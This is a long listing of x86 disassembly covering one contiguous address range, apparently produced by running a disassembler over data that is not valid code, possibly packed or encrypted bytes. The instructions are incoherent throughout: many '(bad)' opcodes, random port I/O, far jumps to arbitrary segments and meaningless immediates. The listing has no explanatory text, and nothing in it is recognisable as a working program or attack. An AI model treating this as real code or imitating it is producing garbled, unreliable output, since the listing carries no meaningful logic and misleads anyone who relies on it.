  4166df:	xor    cl,BYTE PTR [ecx+eiz*4]
  4166e2:	adc    eax,0x704bbd45
  4166e7:	cdq    
  4166e8:	dec    ecx
  4166e9:	mov    edx,es
  4166eb:	aaa    
  4166ec:	icebp  
  4166ed:	shr    BYTE PTR [ebx],0x49
  4166f0:	dec    esi
  4166f1:	add    eax,0x74dcd754
  4166f6:	mov    dl,0x36
  4166f8:	sbb    edi,DWORD PTR [ebx+esi*8-0x4261db81]
  4166ff:	imul   ebx,DWORD PTR [ecx],0x5f5e8da8
  416705:	stos   DWORD PTR es:[edi],eax
  416706:	cmp    eax,0xe482c230
  41670b:	xchg   DWORD PTR [eax+0x53],ecx
  41670e:	sbb    eax,0x3c836551
  416713:	cwde   
  416714:	idiv   bh
  416716:	(bad)  
  416717:	fmul   DWORD PTR [esi+0x37]
  41671a:	jl     0x41673f
  41671c:	cld    
  41671d:	jmp    0xa1b1:0x3b6dab94
  416724:	sbb    eax,0x321934cd
  416729:	aad    0x90
  41672b:	adc    esi,eax
  41672d:	in     al,0x1e
  41672f:	sbb    DWORD PTR [eax+0x2f658401],esp
  416735:	push   ecx
  416736:	push   es
  416737:	xchg   esi,eax
  416738:	ror    ah,1
  41673a:	and    eax,0x88b48f3d
  41673f:	cs shr ebp,cl
  416742:	adc    eax,0x3e747b85
  416747:	sbb    eax,0x59a30d2a
  41674c:	or     ebx,ecx
  41674e:	mov    al,0x28
  416750:	sub    eax,0xf22a9449
  416755:	(bad)  
  416756:	outs   dx,DWORD PTR ds:[esi]
  416757:	mov    dh,0xd5
  416759:	push   cs
  41675a:	test   BYTE PTR [si-0x1be2],cl
  41675f:	sub    BYTE PTR [edi],dh
  416761:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416762:	es aad 0x7e
  416765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416766:	test   BYTE PTR [esi-0x1c4653aa],0xc5
  41676d:	pop    eax
  41676f:	dec    edi
  416770:	mov    ecx,0x7049ae65
  416775:	test   DWORD PTR [eax+0x40],eax
  416778:	xor    al,0xc0
  41677a:	clc    
  41677b:	shl    BYTE PTR [ecx],1
  41677d:	and    eax,0xde4c3a66
  416782:	adc    ebx,DWORD PTR [edx]
  416784:	lea    ebp,[edx+0x1127092b]
  41678a:	sub    bl,al
  41678c:	sub    eax,0xb094924e
  416791:	jle    0x416787
  416793:	scas   eax,DWORD PTR es:[edi]
  416794:	or     eax,0x3202bcde
  416799:	pop    esp
  41679a:	xor    esp,edi
  41679c:	pop    esi
  41679d:	inc    esp
  41679e:	xchg   DWORD PTR [ecx],esp
  4167a0:	fld    TBYTE PTR [eax-0x43]
  4167a3:	adc    BYTE PTR [ebx+0x4e],dl
  4167a6:	add    eax,0x4d45410d
  4167ab:	push   DWORD PTR [esi]
  4167ad:	cmovb  esi,eax
  4167b0:	arpl   WORD PTR [edi+0x7e],bp
  4167b3:	or     BYTE PTR [ebp-0x3ad38a12],bh
  4167b9:	dec    edi
  4167ba:	int3   
  4167bb:	loope  0x4167c1
  4167bd:	dec    edx
  4167be:	or     al,0x20
  4167c0:	or     ecx,esi
  4167c2:	push   ds
  4167c3:	lock jb 0x4167bb
  4167c6:	sub    al,0x89
  4167c8:	popa   
  4167c9:	mov    dl,0xa0
  4167cb:	adc    eax,0x82369db5
  4167d0:	cmp    DWORD PTR [edx+edi*2-0x6],ecx
  4167d4:	int3   
  4167d5:	cld    
  4167d6:	jbe    0x416807
  4167d8:	outs   dx,BYTE PTR ds:[esi]
  4167d9:	aas    
  4167da:	push   ds
  4167db:	mov    al,ds:0x1618712b
  4167e0:	icebp  
  4167e1:	push   eax
  4167e2:	ret    0x929f
  4167e5:	repnz scas eax,DWORD PTR es:[edi]
  4167e7:	popa   
  4167e8:	inc    ebp
  4167e9:	shl    DWORD PTR ds:0xae49ccba,1
  4167ef:	adc    eax,0xd3f5abd1
  4167f4:	push   edx
  4167f5:	adc    dl,BYTE PTR [ecx-0x26b76796]
  4167fb:	mov    ebx,0xa845e051
  416800:	push   es
  416801:	call   0xa3ff3d77
  416806:	dec    ebx
  416807:	sub    ecx,DWORD PTR [ebx+0xa]
  41680a:	sbb    ecx,ecx
  41680c:	push   0x64
  41680e:	mov    bh,0xf8
  416810:	adc    DWORD PTR [edi+0x41433ee7],eax
  416816:	xchg   ecx,eax
  416817:	lds    edx,FWORD PTR [edx-0x31]
  41681a:	jne    0x41682b
  41681c:	cmp    cl,BYTE PTR [ebx]
  41681e:	dec    ebx
  41681f:	imul   eax,DWORD PTR [ebx+eax*2],0xffffffe9
  416823:	pop    es
  416824:	push   esi
  416825:	jg     0x416835
  416827:	cs mov ecx,0x86191908
  41682d:	test   al,0xe
  41682f:	push   ds
  416830:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416831:	loop   0x416856
  416833:	mov    dh,0x7f
  416835:	sub    esi,DWORD PTR [eax+0x7780a9af]
  41683b:	or     ch,BYTE PTR [bx+di-0x48]
  41683f:	jno    0x416897
  416841:	repnz fs cdq 
  416844:	mov    ah,0xa9
  416846:	retf   
  416847:	xchg   esi,eax
  416848:	inc    eax
  416849:	iret   
  41684a:	sbb    eax,0x882c5857
  41684f:	(bad)  
  416850:	adc    eax,0x1b5accfb
  416855:	mov    cl,0xa1
  416857:	xchg   ebp,eax
  416858:	sar    BYTE PTR [ebx+0x702057a4],1
  41685e:	lods   al,BYTE PTR ds:[esi]
  41685f:	inc    esi
  416860:	xchg   esp,eax
  416861:	or     al,0xb4
  416864:	imul   eax,DWORD PTR [edx],0x3359bb78
  41686a:	push   0x0
  41686c:	pop    ds
  41686d:	xchg   ebx,eax
  41686e:	sub    edx,esp
  416870:	in     al,dx
  416871:	mov    edx,0xbfb9d32
  416876:	jno    0x4168f2
  416878:	adc    ah,BYTE PTR [ecx+0x45]
  41687b:	pop    ecx
  41687c:	inc    ecx
  41687d:	push   esp
  41687e:	xchg   edi,eax
  41687f:	jno    0x416816
  416881:	xchg   ah,bh
  416883:	test   BYTE PTR [ebx+0x6e12ea86],0x22
  41688a:	mov    DWORD PTR ss:[ebx-0x32],eax
  41688e:	in     eax,0xda
  416890:	push   es
  416891:	add    al,0xf9
  416893:	sti    
  416894:	mov    al,ds:0xa270bdde
  416899:	dec    esi
  41689a:	push   ecx
  41689b:	addr16 out dx,al
  41689d:	jns    0x41689a
  41689f:	cmp    eax,DWORD PTR [edi+eiz*8+0x1e]
  4168a3:	mov    ch,0xa0
  4168a5:	sub    ebx,eax
  4168a7:	xchg   ecx,eax
  4168a8:	pop    esi
  4168a9:	out    0x5c,al
  4168ab:	mov    al,ds:0x8dde99a7
  4168b0:	xor    cl,bl
  4168b2:	adc    eax,0x5c81ffff
  4168b7:	clc    
  4168b8:	dec    ebx
  4168b9:	cmp    ecx,eax
  4168bb:	inc    esp
  4168bc:	sub    DWORD PTR [ebx],ebx
  4168be:	or     eax,0x14e9cfbf
  4168c3:	add    eax,0x49801502
  4168c8:	mov    esi,0xfef2971e
  4168cd:	xchg   ecx,eax
  4168ce:	jmp    0xa972:0xcc7c8cbf
  4168d5:	mov    ebp,0x48c79eb1
  4168da:	test   BYTE PTR [ecx+0x37bce769],al
  4168e0:	xchg   esi,eax
  4168e1:	bound  ecx,QWORD PTR [ebp-0x56]
  4168e4:	jmp    0x62d2495e
  4168e9:	(bad)  
  4168ea:	cld    
  4168eb:	add    DWORD PTR [eiz*8-0x3d9d08c8],esp
  4168f2:	sbb    DWORD PTR [edx],esi
  4168f4:	push   edi
  4168f5:	aas    
  4168f6:	cdq    
  4168f7:	enter  0x4b44,0xdc
  4168fb:	or     eax,0x17da53df
  416900:	ins    BYTE PTR es:[edi],dx
  416901:	pop    eax
  416902:	jbe    0x4168ff
  416904:	push   ss
  416905:	xor    eax,DWORD PTR cs:[edi-0xe]
  416909:	ret    
  41690a:	add    dl,ch
  41690c:	sahf   
  41690d:	je     0x4168a5
  41690f:	cld    
  416910:	int3   
  416911:	sar    esi,1
  416913:	retf   
  416914:	sbb    ebx,esp
  416916:	or     ecx,DWORD PTR [esi]
  416918:	lahf   
  416919:	imul   eax,DWORD PTR [esi+0x7fb2b982],0x3a
  416920:	mov    al,0xaf
  416922:	mov    al,0xf2
  416924:	sub    esi,esp
  416926:	jne    0x41696f
  416928:	add    eax,0xd15837d2
  41692d:	sub    ecx,DWORD PTR [ebx-0x104b3d8a]
  416933:	cwde   
  416934:	int    0xa1
  416936:	mov    ch,BYTE PTR [ecx-0x3]
  416939:	sub    BYTE PTR [esi+0x234bf536],dh
  41693f:	jno    0x4169ad
  416941:	or     eax,DWORD PTR [ebp+ecx*1-0x131789f4]
  416948:	loopne 0x4169b0
  41694a:	mov    ds:0xd19190ce,eax
  41694f:	jne    0x41693b
  416951:	inc    edi
  416952:	add    al,0xd5
  416954:	and    bh,BYTE PTR [ebx+ebx*1+0x1d236c0d]
  41695b:	mov    WORD PTR [ebx-0x4b2243c0],?
  416961:	inc    esi
  416962:	frstor [eax-0x2f]
  416965:	jge    0x416997
  416967:	ja     0x4169a0
  416969:	add    dh,BYTE PTR [eax+0x1e]
  41696c:	and    DWORD PTR [ebx+0x751e7459],esi
  416972:	sub    BYTE PTR [esi],0xf6
  416975:	rol    esi,cl
  416977:	retf   0x9699
  41697a:	mov    al,0x9e
  41697c:	stos   DWORD PTR es:[edi],eax
  41697d:	stos   DWORD PTR es:[edi],eax
  41697e:	das    
  41697f:	push   edx
  416980:	pop    ds
  416981:	or     edx,DWORD PTR ds:0xeb8060bd
  416987:	jp     0x41699e
  416989:	fmulp  st(4),st
  41698b:	pop    edx
  41698c:	cmp    eax,0xdf1db4e0
  416991:	adc    al,0x4
  416993:	ins    DWORD PTR es:[edi],dx
  416994:	stos   BYTE PTR es:[edi],al
  416995:	fmul   st(6),st
  416997:	imul   ebx,DWORD PTR [esi-0xc1c29e1],0x2
  41699e:	mov    esi,0xc4b530e3
  4169a3:	nop
  4169a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169a5:	outs   dx,DWORD PTR ds:[esi]
  4169a6:	inc    eax
  4169a7:	jne    0x416a02
  4169a9:	cs pushf 
  4169ab:	imul   ebp,ebx,0xffffffe3
  4169ae:	mov    dh,0x21
  4169b0:	int3   
  4169b1:	inc    esi
  4169b2:	loop   0x416948
  4169b4:	loop   0x4169ec
  4169b6:	mov    esi,0x276b74bc
  4169bb:	add    al,0x36
  4169bd:	loopne 0x4169fb
  4169bf:	pop    edx
  4169c0:	out    dx,eax
  4169c1:	jl     0x416956
  4169c3:	ror    BYTE PTR [ecx+0x0],0x1b
  4169c7:	push   cs
  4169c8:	mov    WORD PTR [eax],gs
  4169ca:	mov    WORD PTR [ebx],?
  4169cc:	mov    edi,0x54a3c36b
  4169d1:	lds    ecx,FWORD PTR [edx]
  4169d3:	or     DWORD PTR [esi-0x452b396c],eax
  4169d9:	(bad)  
  4169db:	add    eax,0xb48711f9
  4169e0:	ror    esp,0x63
  4169e3:	pop    ebx
  4169e4:	sbb    al,0x4d
  4169e6:	push   eax
  4169e7:	clc    
  4169e8:	and    BYTE PTR [eax],bl
  4169ea:	lock cld 
  4169ec:	push   ebx
  4169ed:	ret    
  4169ee:	cmp    DWORD PTR [ebp-0x15],ebp
  4169f1:	push   esi
  4169f2:	(bad)  
  4169f4:	or     eax,0x47ebc721
  4169f9:	jge    0x416a2d
  4169fb:	adc    ah,BYTE PTR [eax-0x2389770e]
  416a01:	iret   
  416a02:	sti    
  416a03:	mov    ch,BYTE PTR [esi-0x5e]
  416a06:	mov    ch,0xe8
  416a08:	clc    
  416a09:	scas   eax,DWORD PTR es:[edi]
  416a0a:	cli    
  416a0b:	push   ss
  416a0c:	sahf   
  416a0d:	dec    ebp
  416a0e:	sub    eax,0x54c04252
  416a13:	push   edi
  416a14:	out    dx,eax
  416a15:	xor    al,0xc6
  416a17:	xchg   esi,eax
  416a18:	mov    edi,0x76bfae4c
  416a1d:	das    
  416a1e:	in     al,dx
  416a1f:	fist   WORD PTR [edi-0x8]
  416a22:	push   edx
  416a23:	adc    DWORD PTR [edx],eax
  416a25:	cdq    
  416a26:	jo     0x416a85
  416a28:	pop    ebp
  416a29:	pop    edx
  416a2a:	retf   
  416a2b:	inc    ebx
  416a2c:	jo     0x416a8f
  416a2e:	stc    
  416a2f:	call   0x479ecf2f
  416a34:	(bad)  [ebx-0x2eb16a22]
  416a3a:	div    DWORD PTR [edx-0x41]
  416a3d:	fsubp  st(4),st
  416a3f:	loopne 0x4169c6
  416a41:	push   0xc76c7638
  416a46:	inc    edx
  416a47:	arpl   cx,di
  416a49:	into   
  416a4a:	jns    0x416a77
  416a4c:	clc    
  416a4d:	adc    al,0x48
  416a4f:	bound  edx,QWORD PTR ds:0xba0b2da7
  416a55:	(bad)  
  416a57:	adc    al,0xee
  416a59:	push   0x68
  416a5b:	push   eax
  416a5c:	nop
  416a5d:	rcl    DWORD PTR [ebp-0x6a],0xdd
  416a61:	shl    BYTE PTR [ebx],0xaf
  416a64:	xchg   edi,eax
  416a65:	fadd   QWORD PTR [eax]
  416a67:	call   0x4d6486de
  416a6c:	xchg   esp,eax
  416a6d:	or     eax,0xb6d75db6
  416a72:	test   DWORD PTR [edx],esi
  416a74:	xchg   ecx,eax
  416a75:	sub    DWORD PTR [edx+0x29],0x63ff3270
  416a7c:	and    esi,eax
  416a7e:	mov    esp,0x72c65938
  416a83:	jg     0x416aa4
  416a85:	sar    ebx,cl
  416a87:	out    0xc1,al
  416a89:	add    BYTE PTR [esp+eax*1-0x49195f92],bl
  416a90:	aam    0xad
  416a92:	add    edx,eax
  416a94:	cmp    esp,DWORD PTR [edi]
  416a96:	bound  esi,QWORD PTR [edx]
  416a98:	in     eax,0x58
  416a9a:	fisttp DWORD PTR [ebx-0x5c]
  416a9d:	in     eax,dx
  416a9e:	jp     0x416adb
  416aa0:	jne    0x416ae7
  416aa2:	ret    0x7574
  416aa5:	push   0xffffff8a
  416aa7:	pop    esi
  416aa8:	pop    esp
  416aa9:	sbb    BYTE PTR [edi],dl
  416aab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416aac:	fisttp DWORD PTR [ecx+0x1960ff96]
  416ab2:	out    0x36,al
  416ab4:	pushf  
  416ab5:	(bad)  [edi+0x72]
  416ab8:	adc    esi,DWORD PTR [ebp-0x4c1d0f32]
  416abe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416abf:	out    0x54,eax
  416ac1:	mov    ecx,DWORD PTR [edi]
  416ac3:	pop    esi
  416ac4:	mov    DWORD PTR [ecx-0x7f1bca4b],ecx
  416aca:	out    0x81,al
  416acc:	adc    cl,BYTE PTR [edx]
  416ace:	fiadd  WORD PTR [edx-0x7f]
  416ad1:	mov    es,WORD PTR [esi-0x3778e46d]
  416ad7:	mov    WORD PTR [edi+0x13b3243e],ds
  416add:	and    eax,ebx
  416adf:	ins    BYTE PTR es:[edi],dx
  416ae0:	out    0xa3,eax
  416ae2:	es push 0xffffffe9
  416ae5:	inc    ecx
  416ae6:	push   ss
  416ae7:	pop    edx
  416ae8:	sub    DWORD PTR [ebx+ebp*1],edi
  416aeb:	shld   ecx,esi,0x50
  416aef:	add    ch,BYTE PTR [esi+edi*4-0x16b9e8f7]
  416af6:	ins    DWORD PTR es:[edi],dx
  416af7:	mov    esp,0x6363ddd0
  416afc:	push   0xdabd59c
  416b01:	pushf  
  416b02:	xor    cl,BYTE PTR [ebp+0x7f]
  416b05:	jmp    0x416af6
  416b07:	adc    ecx,edx
  416b09:	sbb    edi,esi
  416b0b:	jno    0x416af7
  416b0d:	push   edx
  416b0e:	jle    0x416b4f
  416b10:	sub    al,0x32
  416b12:	mov    eax,ds:0x748c302
  416b17:	pop    edi
  416b18:	pop    es
  416b19:	lea    esi,[edi+0x60]
  416b1c:	in     al,0x4e
  416b1e:	jl     0x416b42
  416b20:	xor    ah,BYTE PTR [eax-0x1]
  416b23:	fbstp  TBYTE PTR [edi-0x1b]
  416b26:	add    al,0xa6
  416b28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b29:	jecxz  0x416b48
  416b2b:	inc    eax
  416b2c:	shl    DWORD PTR [eax-0x67],cl
  416b2f:	inc    eax
  416b30:	pop    ecx
  416b31:	fidiv  DWORD PTR [edi-0x5516b760]
  416b37:	stc    
  416b38:	dec    edx
  416b39:	fcom   QWORD PTR [ebx+eiz*2-0x7abbfefb]
  416b40:	popa   
  416b41:	xor    eax,0x16a60bb4
  416b46:	arpl   WORD PTR [ebp+eax*2-0xc96aeed],bx
  416b4d:	pop    ebx
  416b4e:	mov    dh,0xef
  416b50:	call   0x2a96:0x5070391f
  416b57:	out    0x43,eax
  416b59:	cdq    
  416b5a:	add    cl,BYTE PTR [eax]
  416b5c:	in     eax,0x75
  416b5e:	mov    cl,0x72
  416b60:	stos   DWORD PTR es:[edi],eax
  416b61:	mov    ah,0x89
  416b63:	scas   eax,DWORD PTR es:[edi]
  416b64:	xchg   esp,eax
  416b65:	inc    ebp
  416b67:	cld    
  416b68:	mov    DWORD PTR [edi-0x6c],esi
  416b6b:	data16 int3 
  416b6d:	fld    DWORD PTR [ebx-0x2f]
  416b70:	int3   
  416b71:	aad    0xad
  416b73:	xor    edx,esp
  416b75:	mov    edx,fs
  416b77:	aam    0xc4
  416b79:	inc    edx
  416b7a:	mov    dh,BYTE PTR [edx-0x71]
  416b7d:	jns    0x416bb2
  416b7f:	iret   
  416b80:	stos   DWORD PTR es:[edi],eax
  416b81:	ret    0x9e5c
  416b84:	fstp   QWORD PTR [ecx+0x6f]
  416b87:	outs   dx,BYTE PTR ds:[esi]
  416b88:	add    BYTE PTR [edx-0x23b205a6],dh
  416b8e:	inc    ecx
  416b8f:	or     BYTE PTR [edi+0x5fe3326b],dl
  416b95:	push   ss
  416b96:	(bad)  
  416b98:	mov    ecx,gs
  416b9a:	stos   DWORD PTR es:[edi],eax
  416b9b:	inc    esp
  416b9c:	fisttp WORD PTR [edx]
  416b9e:	add    dh,BYTE PTR [ebx]
  416ba0:	in     al,0xf
  416ba2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ba3:	sar    DWORD PTR [ecx],0x3e
  416ba6:	dec    ecx
  416ba7:	cs ror ecx,cl
  416baa:	test   eax,0x5253ccd1
  416baf:	or     eax,0x1e07e467
  416bb4:	mov    ebx,DWORD PTR [eax-0x2a57c11c]
  416bba:	dec    ebp
  416bbb:	pop    es
  416bbc:	inc    edx
  416bbd:	or     ch,BYTE PTR [ebx]
  416bbf:	pop    eax
  416bc0:	xor    BYTE PTR [esi-0x26081ac8],ah
  416bc6:	call   0x2a8c:0x5f824ce6
  416bcd:	push   ds
  416bce:	ror    ch,0x75
  416bd1:	(bad)  
  416bd2:	adc    BYTE PTR [ebx-0xf968c8c],al
  416bd8:	add    DWORD PTR [esi-0x56d55859],eax
  416bde:	rcr    DWORD PTR [esi+0x44],0xc8
  416be2:	push   ebx
  416be3:	xchg   esp,eax
  416be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416be5:	jp     0x416bd9
  416be7:	fucomi st,st(4)
  416be9:	cmp    al,BYTE PTR [eax+0xde7db02]
  416bef:	push   0x74
  416bf1:	lods   eax,DWORD PTR ds:[esi]
  416bf2:	push   ebx
  416bf3:	js     0x416c73
  416bf5:	xor    dl,dl
  416bf7:	mov    DWORD PTR [ebp+0x4a49dbb9],eax
  416bfd:	pop    ebp
  416bfe:	in     eax,dx
  416bff:	add    eax,0x3f40bf01
  416c04:	retf   0xbd5b
  416c07:	icebp  
  416c08:	and    al,ah
  416c0a:	mov    cl,BYTE PTR [eax+edi*1]
  416c0d:	xor    al,bl
  416c0f:	xchg   ecx,eax
  416c10:	call   0xdabf:0x999a4131
  416c17:	mov    al,BYTE PTR ds:0x954ee49b
  416c1d:	push   edi
  416c1e:	outs   dx,DWORD PTR ds:[esi]
  416c1f:	in     eax,dx
  416c20:	xor    ah,BYTE PTR [ebx+0x24]
  416c23:	xchg   di,ax
  416c25:	cld    
  416c26:	push   cs
  416c27:	test   eax,0x53e84a1c
  416c2c:	xchg   esi,eax
  416c2d:	shl    DWORD PTR [eax],cl
  416c2f:	xchg   esi,eax
  416c30:	shl    BYTE PTR [ebx+0x3f],cl
  416c33:	lahf   
  416c34:	mov    eax,DWORD PTR [esi-0x2e]
  416c37:	and    BYTE PTR [ebx-0x22543d97],dl
  416c3d:	stc    
  416c3e:	ficom  DWORD PTR [ecx]
  416c40:	pop    ebp
  416c41:	scas   eax,DWORD PTR es:[edi]
  416c42:	scas   eax,DWORD PTR es:[edi]
  416c43:	fcom   DWORD PTR [ebp-0x3821dbb7]
  416c49:	mov    cl,0xe3
  416c4b:	jns    0x416c90
  416c4d:	ja     0x416cbf
  416c4f:	shl    dl,1
  416c51:	or     DWORD PTR [ebx+ebp*4+0x5acb02b4],esi
  416c58:	pop    ebp
  416c59:	stc    
  416c5a:	or     dl,cl
  416c5c:	push   ss
  416c5d:	mov    ds:0x588a090b,eax
  416c62:	retf   0xf5ef
  416c65:	dec    esp
  416c66:	test   al,0xe6
  416c68:	fisttp WORD PTR [eax-0x2d54485a]
  416c6e:	push   ebx
  416c6f:	cld    
  416c70:	(bad)  
  416c71:	push   esp
  416c72:	mov    ebp,0xe711d07c
  416c77:	ror    DWORD PTR [esi+eax*1-0x7c],cl
  416c7b:	pop    esi
  416c7c:	or     cl,BYTE PTR [esi+0x3530a01c]
  416c82:	cld    
  416c83:	hlt    
  416c84:	push   ebp
  416c85:	or     al,BYTE PTR [edi]
  416c87:	dec    ebx
  416c88:	xchg   BYTE PTR ds:0xa63e2923,bl
  416c8e:	add    bh,BYTE PTR [ebx-0x1908e4ca]
  416c94:	mov    edx,0x1684cd4c
  416c99:	mov    eax,0x24bd60dc
  416c9e:	mov    ecx,0xc51f7daf
  416ca3:	das    
  416ca4:	cli    
  416ca5:	jbe    0x416c7a
  416ca7:	jo     0x416ce8
  416ca9:	mov    gs,WORD PTR [ebx-0x4bf1e8fa]
  416caf:	jmp    0x416c90
  416cb1:	jp     0x416c4f
  416cb3:	xor    DWORD PTR [ebx+0x2e],ebx
  416cb6:	pop    eax
  416cb7:	repz cmp bl,BYTE PTR [eax+0x135d7db3]
  416cbe:	dec    edx
  416cbf:	add    ah,bl
  416cc1:	ds push ebp
  416cc3:	(bad)  
  416cc5:	sbb    cl,dl
  416cc7:	cdq    
  416cc8:	out    0xda,al
  416cca:	in     al,0xe6
  416ccc:	sti    
  416ccd:	sbb    eax,DWORD PTR [esi-0x77710ad1]
  416cd3:	ins    BYTE PTR es:[edi],dx
  416cd4:	fs test eax,0x3dd08799
  416cda:	lahf   
  416cdb:	dec    edx
  416cdc:	(bad)  
  416cdd:	jle    0x416c84
  416cdf:	mov    edx,ebp
  416ce1:	adc    bh,BYTE PTR [edx-0x4e1d927a]
  416ce7:	aad    0xbc
  416ce9:	lahf   
  416cea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ceb:	inc    ebx
  416cec:	sub    eax,0x7ed91b44
  416cf1:	jne    0x416d20
  416cf3:	ja     0x416cb2
  416cf5:	mov    edx,0xc8ce835e
  416cfa:	(bad)  
  416cfc:	ja     0x416cc9
  416cfe:	lock (bad) 
  416d00:	lock and dh,0x32
  416d04:	(bad)  
  416d06:	bnd je 0x416d1a
  416d09:	jns    0x416ce0
  416d0b:	out    dx,eax
  416d0c:	test   ch,ah
  416d0e:	shl    BYTE PTR [edx+eiz*1+0x78],0x9c
  416d13:	ror    DWORD PTR [ecx+0x24e08cd],cl
  416d19:	out    dx,al
  416d1a:	add    al,BYTE PTR [esi+0x2a]
  416d1d:	and    ebx,DWORD PTR [edx-0x5006ca70]
  416d23:	ins    BYTE PTR es:[edi],dx
  416d24:	fbstp  TBYTE PTR [eax-0x78]
  416d27:	or     al,0x55
  416d29:	or     bh,cl
  416d2b:	lds    esp,FWORD PTR [ebx+0x5c]
  416d2e:	inc    eax
  416d2f:	adc    BYTE PTR [edi],0xe5
  416d32:	fnstenv [esi-0x5753f1cf]
  416d38:	loopne 0x416cdf
  416d3a:	out    dx,eax
  416d3b:	stc    
  416d3c:	mov    esi,0x9c220880
  416d41:	add    eax,0xa9cabb59
  416d46:	mov    bh,0xee
  416d48:	cmp    edx,DWORD PTR [ecx]
  416d4a:	sbb    eax,0xe83538e6
  416d4f:	out    0xe1,eax
  416d51:	jne    0x416d03
  416d53:	pop    ebp
  416d54:	add    eax,0x69003dd6
  416d59:	sar    edi,1
  416d5b:	dec    esi
  416d5c:	add    ebx,DWORD PTR [eax+ebx*2+0x44cd3456]
  416d63:	sub    DWORD PTR [esi+0x360e9939],esp
  416d69:	mov    edi,0x8fc8987b
  416d6e:	les    esi,FWORD PTR [edi+0xb]
  416d71:	mov    bh,BYTE PTR ds:0x7ba134ce
  416d77:	xchg   edi,eax
  416d78:	mov    ds:0x74e24672,al
  416d7d:	mov    DWORD PTR [ebp+0x7671caae],edi
  416d83:	xor    al,0xd8
  416d85:	loop   0x416d7b
  416d87:	ret    0x8ede
  416d8a:	cld    
  416d8b:	in     al,dx
  416d8c:	sub    al,0x96
  416d8e:	arpl   WORD PTR ds:0x6c712faa,dx
  416d94:	xor    BYTE PTR [edi],ah
  416d96:	dec    esp
  416d97:	outs   dx,BYTE PTR ds:[esi]
  416d98:	into   
  416d99:	pop    ss
  416d9a:	mov    ds:0xd734d7d6,eax
  416d9f:	test   al,0xf7
  416da1:	scas   al,BYTE PTR es:[edi]
  416da2:	test   eax,0xc4672a52
  416da7:	pop    edi
  416da8:	push   ss
  416da9:	inc    ebp
  416daa:	pop    esp
  416dab:	mov    ebp,0xf6cfa359
  416db0:	sbb    edx,edi
  416db2:	call   DWORD PTR ds:0xb90e0baf
  416db8:	sub    ah,bl
  416dba:	cwde   
  416dbb:	out    dx,al
  416dbc:	int    0x92
  416dbe:	dec    ecx
  416dbf:	sbb    BYTE PTR [ebx],ah
  416dc1:	cmp    al,0xb0
  416dc3:	jb     0x416dca
  416dc5:	call   0x83ff9a97
  416dca:	stos   BYTE PTR es:[edi],al
  416dcb:	fst    QWORD PTR [eax+ecx*1+0x5543105f]
  416dd2:	adc    ah,0xea
  416dd5:	shr    DWORD PTR [ecx-0x52],cl
  416dd8:	loopne 0x416e1b
  416dda:	cmc    
  416ddb:	pop    es
  416ddc:	xor    al,0x1d
  416dde:	and    eax,0xdef20fb0
  416de3:	int    0x11
  416de5:	clc    
  416de6:	mov    ebx,0x158ec1c5
  416deb:	fcomp  st(5)
  416ded:	pop    esi
  416dee:	add    dl,dh
  416df0:	(bad)  
  416df1:	and    eax,0x61707d30
  416df6:	retf   
  416df7:	push   ds
  416df8:	lods   al,BYTE PTR ds:[esi]
  416df9:	stos   DWORD PTR es:[edi],eax
  416dfa:	jmp    0xcbf1:0x88993d0c
  416e01:	cwde   
  416e02:	ret    0x10e0
  416e05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e06:	xor    edx,DWORD PTR [edi+ebp*1+0x6bda5f87]
  416e0d:	int3   
  416e0e:	mov    DWORD PTR [ebp+ecx*1-0x6d],ebp
  416e12:	adc    eax,0x49996b31
  416e17:	cmp    BYTE PTR [edx-0x1b535ffb],bh
  416e1d:	lahf   
  416e1e:	mov    ds:0x90fe685e,al
  416e23:	xchg   ecx,eax
  416e24:	jmp    DWORD PTR [edx+edx*8+0x6107262c]
  416e2b:	dec    edx
  416e2c:	lahf   
  416e2d:	fsubr  st,st(5)
  416e2f:	mov    bh,0x98
  416e31:	fwait
  416e32:	clc    
  416e33:	es popf 
  416e35:	push   esi
  416e36:	mov    dh,0x76
  416e38:	mov    ebx,0x4cbd19cf
  416e3d:	add    BYTE PTR [ecx],0x36
  416e40:	and    BYTE PTR ds:0x5a3c4e6,cl
  416e46:	adc    BYTE PTR [ebx-0x43],0x9e
  416e4a:	jle    0x416e9e
  416e4c:	loope  0x416e42
  416e4e:	iret   
  416e4f:	mov    bh,0xd6
  416e51:	ja     0x416e33
  416e53:	sar    BYTE PTR [eax+ebp*2-0x18],0x39
  416e58:	shr    DWORD PTR ds:0xe69e5064,1
  416e5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e5f:	fs dec eax
  416e61:	pop    es
  416e62:	addr16 pop edi
  416e64:	pop    es
  416e65:	int    0x1c
  416e67:	inc    ebp
  416e68:	data16 mov bh,0x3
  416e6b:	inc    ecx
  416e6c:	aas    
  416e6d:	rcr    DWORD PTR [eax+0x3a],1
  416e70:	push   0x45
  416e72:	call   0x3c7333b4
  416e77:	or     DWORD PTR ss:[edi+0x280918c5],ebp
  416e7e:	call   0xa385:0x4e61b80d
  416e85:	sbb    DWORD PTR [edi+0x7ab6e6c8],ebp
  416e8b:	stos   BYTE PTR es:[edi],al
  416e8c:	inc    edi
  416e8d:	sbb    al,0x21
  416e8f:	pop    ecx
  416e90:	cmp    bl,BYTE PTR [ebp-0x58]
  416e93:	(bad)  [edx+0x31]
  416e96:	add    DWORD PTR [ebx-0x46],ecx
  416e99:	(bad)  
  416e9a:	(bad)  
  416e9b:	popf   
  416e9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e9d:	or     DWORD PTR [eax],0x6
  416ea0:	dec    ecx
  416ea1:	into   
  416ea2:	and    al,0x1b
  416ea4:	(bad)  
  416ea5:	stc    
  416ea6:	loop   0x416eee
  416ea8:	iret   
  416ea9:	or     DWORD PTR [ebx+0x26ed31b0],ecx
  416eaf:	adc    ah,dl
  416eb1:	(bad)  
  416eb2:	fnstenv [edx-0x37]
  416eb5:	jl     0x416ee4
  416eb7:	sub    DWORD PTR [ebp-0x6816f31f],esp
